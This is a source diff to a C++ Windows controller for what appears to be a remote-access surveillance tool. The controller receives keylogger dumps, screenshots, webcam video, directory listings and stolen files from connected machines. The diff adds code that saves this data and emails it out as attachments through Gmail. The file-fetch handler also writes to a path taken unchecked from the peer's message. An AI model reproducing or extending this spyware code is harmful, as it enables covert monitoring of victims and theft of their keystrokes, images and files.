@@ -20,7 +20,6 @@ GuiScrollableTextDisplay miniConsole;
 const std::string serverTempFolderName = "server_tmp";  //must not be empty string !
 
 GmailHandler gmail;
-MailMessage mailMsg;
 
 ///////////////////////////////////////////////
 
@@ -82,85 +81,149 @@ public:
 
 private:
     void executeMessage(const Message& msg) {
+        std::string errorString = "";
+        std::string emailAddressSendback = "";
+        json jsonData;
+        try {
+            jsonData = json::parse(std::string(msg.getJsonData(), msg.getJsonDataSize()));
+        } catch (...) {
+            jsonData = json();
+        }
+        if(jsonData.contains("errorString")) errorString = jsonData.at("errorString");
+        if(jsonData.contains("email")) emailAddressSendback = jsonData.at("email");
+
+        //REMOVE LATER!
+        // emailAddressSendback = "[ur-email]@gmail.com";
+
+        MailMessage mailMsg;
+        mailMsg.from = gmail.getEmailAddress();
+        mailMsg.to = emailAddressSendback;
+        mailMsg.subject = "[PROJECTMMT-REPLY] " + this->getPeerIpPort();
+        mailMsg.attachment_paths = {};
+
         if(msg.returnCode == 0) {
-            std::string errorString = "";
-            json jsonData = std::string(msg.getJsonData(), msg.getJsonDataSize());
-            if(jsonData.contains("errorString")) errorString = jsonData.at("errorString");
+            //fail
             switch(msg.commandNumber) {
                 case MessageDisableKeylog: {
                     miniConsole.AddLineError("MessageDisableKeylog failed: %s", errorString.c_str());
+                    mailMsg.body_text = "MessageDisableKeylog failed: " + errorString;
+                    break;
+                }
+                case MessageEnableKeylog: {
+                    miniConsole.AddLineError("MessageEnableKeylog failed: %s", errorString.c_str());
+                    mailMsg.body_text = "MessageEnableKeylog failed: " + errorString;
+                    break;
+                }
+                case MessageScreenCap: {
+                    miniConsole.AddLineError("MessageScreenCap failed: %s", errorString.c_str());
+                    mailMsg.body_text = "MessageScreenCap failed: " + errorString;
+                    break;
+                }
+                case MessageInvokeWebcam: {
+                    miniConsole.AddLineError("MessageInvokeWebcam failed: %s", errorString.c_str());
+                    mailMsg.body_text = "MessageInvokeWebcam failed: " + errorString;
+                    break;
+                }
+                case MessageListFile: {
+                    miniConsole.AddLineError("MessageListFile failed: %s", errorString.c_str());
+                    mailMsg.body_text = "MessageListFile failed: " + errorString;
+                    break;
+                }
+                case MessageGetFile: {
+                    miniConsole.AddLineError("MessageGetFile failed: %s", errorString.c_str());
+                    mailMsg.body_text = "MessageGetFile failed: " + errorString;
                     break;
                 }
             }
-            return;
+        } else {
+            switch(msg.commandNumber) {
+                case MessageEnableKeylog: {
+                    //print nothing as we already displayed on gui
+                    mailMsg.body_text = "Keylogger enabled";
+                    break;
+                }
+                case MessageDisableKeylog: {
+                    std::string filename = serverTempFolderName + "/keylog_" + getCurrentIsoTime() + ".txt";
+                    std::ofstream outfile(filename, std::ios::out | std::ios::binary);
+                    if(!outfile) {
+                        miniConsole.AddLineError("Keylogger data failed to save to file");
+                        break;
+                    }
+                    outfile.write(msg.getBinaryData(), msg.getBinaryDataSize());
+                    outfile.close();
+                    miniConsole.AddLineInfo("Keylogger data saved to file %s", filename.c_str());
+                    mailMsg.attachment_paths = {filename};
+                    break;
+                }
+                case MessageScreenCap: {
+                    std::string filename = serverTempFolderName + "/screencap_" + getCurrentIsoTime() + ".jpg";
+                    std::ofstream outfile(filename, std::ios::out | std::ios::binary);
+                    if(!outfile) {
+                        miniConsole.AddLineError("Screencap data failed to save to file");
+                        break;
+                    }
+                    outfile.write(msg.getBinaryData(), msg.getBinaryDataSize());
+                    outfile.close();
+                    miniConsole.AddLineInfo("Screencap data saved to file %s", filename.c_str());
+                    mailMsg.attachment_paths = {filename};
+                    break;
+                } 
+                case MessageInvokeWebcam: {
+                    std::string filename = serverTempFolderName + "/webcam_" + getCurrentIsoTime() + ".mp4";
+                    std::ofstream outfile(filename, std::ios::out | std::ios::binary);
+                    if(!outfile) {
+                        miniConsole.AddLineError("webcam data failed to save to file");
+                        break;
+                    }
+                    outfile.write(msg.getBinaryData(), msg.getBinaryDataSize());
+                    outfile.close();
+                    miniConsole.AddLineInfo("webcam data saved to file %s", filename.c_str());
+                    mailMsg.attachment_paths = {filename};
+                    break;
+                }
+
+                case MessageListFile: {
+                    json jsonFileListingData = json::parse(std::string(msg.getBinaryData(), msg.getBinaryDataSize()));
+                    std::string jsonBeautified = jsonFileListingData.dump(4);
+
+                    std::string filename = serverTempFolderName + "/pathquery_" + getCurrentIsoTime() + ".json";
+                    std::ofstream outfile(filename, std::ios::out | std::ios::binary);
+                    if(!outfile) {
+                        miniConsole.AddLineError("listing directory failed to save to file");
+                        break;
+                    }
+                    outfile.write(jsonBeautified.c_str(), jsonBeautified.size());
+                    outfile.close();
+                    miniConsole.AddLineInfo("listing directory saved to file %s", filename.c_str());
+                    mailMsg.attachment_paths = {filename};
+                    break;
+                }
+
+                case MessageGetFile: {
+                    json jsonData = json::parse(std::string(msg.getJsonData(), msg.getJsonDataSize()));
+                    std::string filename = serverTempFolderName + '/' + (std::string) jsonData.at("fileName");
+                    std::ofstream outfile(filename, std::ios::out | std::ios::binary);
+                    if(!outfile) {
+                        miniConsole.AddLineError("get file failed to save to file");
+                        break;
+                    }
+                    outfile.write(msg.getBinaryData(), msg.getBinaryDataSize());
+                    outfile.close();
+                    miniConsole.AddLineInfo("get file saved to file %s", filename.c_str());
+                    mailMsg.attachment_paths = {filename};
+                    break;
+                }
+            }
         }
 
-        switch(msg.commandNumber) {
-            case MessageDisableKeylog: {
-                std::string filename = serverTempFolderName + "/keylog_" + getCurrentIsoTime() + ".txt";
-                std::ofstream outfile(filename, std::ios::out | std::ios::binary);
-                if(!outfile) {
-                    miniConsole.AddLineError("Keylogger data failed to save to file");
-                    break;
-                }
-                outfile.write(msg.getBinaryData(), msg.getBinaryDataSize());
-                outfile.close();
-                miniConsole.AddLineInfo("Keylogger data saved to file %s", filename.c_str());
-                break;
-            }
-            case MessageScreenCap: {
-                std::string filename = serverTempFolderName + "/screencap_" + getCurrentIsoTime() + ".jpg";
-                std::ofstream outfile(filename, std::ios::out | std::ios::binary);
-                if(!outfile) {
-                    miniConsole.AddLineError("Screencap data failed to save to file");
-                    break;
-                }
-                outfile.write(msg.getBinaryData(), msg.getBinaryDataSize());
-                outfile.close();
-                miniConsole.AddLineInfo("Screencap data saved to file %s", filename.c_str());
-                break;
-            } 
-            case MessageInvokeWebcam: {
-                std::string filename = serverTempFolderName + "/webcam_" + getCurrentIsoTime() + ".mp4";
-                std::ofstream outfile(filename, std::ios::out | std::ios::binary);
-                if(!outfile) {
-                    miniConsole.AddLineError("webcam data failed to save to file");
-                    break;
-                }
-                outfile.write(msg.getBinaryData(), msg.getBinaryDataSize());
-                outfile.close();
-                miniConsole.AddLineInfo("webcam data saved to file %s", filename.c_str());
-                break;
-            }
-
-            case MessageListFile: {
-                json jsonFileListingData = json::parse(std::string(msg.getBinaryData(), msg.getBinaryDataSize()));
-                std::string jsonBeautified = jsonFileListingData.dump(4);
-
-                std::string filename = serverTempFolderName + "/pathquery_" + getCurrentIsoTime() + ".json";
-                std::ofstream outfile(filename, std::ios::out | std::ios::binary);
-                if(!outfile) {
-                    miniConsole.AddLineError("listing directory failed to save to file");
-                    break;
-                }
-                outfile.write(jsonBeautified.c_str(), jsonBeautified.size());
-                outfile.close();
-                miniConsole.AddLineInfo("listing directory saved to file %s", filename.c_str());
-                break;
-            }
-
-            case MessageGetFile: {
-                json jsonData = json::parse(std::string(msg.getJsonData(), msg.getJsonDataSize()));
-                std::string filename = serverTempFolderName + '/' + (std::string) jsonData.at("fileName");
-                std::ofstream outfile(filename, std::ios::out | std::ios::binary);
-                if(!outfile) {
-                    miniConsole.AddLineError("get file failed to save to file");
-                    break;
-                }
-                outfile.write(msg.getBinaryData(), msg.getBinaryDataSize());
-                outfile.close();
-                miniConsole.AddLineInfo("get file saved to file %s", filename.c_str());
-                break;
+        //send back email
+        if(emailAddressSendback != "") {
+            std::string messageIdOnSuccess;
+            bool sendMailStatus = gmail.sendEmail(mailMsg.createMimeMessage(), messageIdOnSuccess, &errorString);
+            if(sendMailStatus) {
+                miniConsole.AddLineSuccess("Send email to %s success. Message id %s", mailMsg.to.c_str(), messageIdOnSuccess.c_str());
+            } else {
+                miniConsole.AddLineError("Send email to %s failed. Error: %s", mailMsg.to.c_str(), errorString.c_str());
             }
         }
     }
@@ -651,17 +714,15 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, WCHAR *lpCmdLi
     UNREFERENCED_PARAMETER(lpCmdLine);
     UNREFERENCED_PARAMETER(nCmdShow);
     if(!CreateDirectoryCrossPlatform(serverTempFolderName)) {
-
-        std::cerr << "Fatal error: Can't create folder for temporary server data\n";
+        MessageBoxW(nullptr, L"Fatal error: Can't create folder for temporary server data", L"Critical error", MB_ICONERROR);
         return -1;
     }
 
     WSADATA wsaData;
     // Initialize Winsock
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-        allocateConsoleWin();
-        std::cerr << "WSAStartup failed\n";
-        return 1;
+        MessageBoxW(nullptr, L"WSAStartup failed", L"Critical error", MB_ICONERROR);
+        return -1;
     }
 
     //Setup connection manager
@@ -669,8 +730,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, WCHAR *lpCmdLi
 
     //Setup gmail
     if(!gmail.loadCredential("credential.json")) {
-        allocateConsoleWin();
-        std::cerr << "Failed to load essential credential\n";
+        MessageBoxW(nullptr, L"Failed to load essential credential in credential.json", L"Critical error", MB_ICONERROR);
         return -1;
     }
     if(!gmail.reauth("")) {
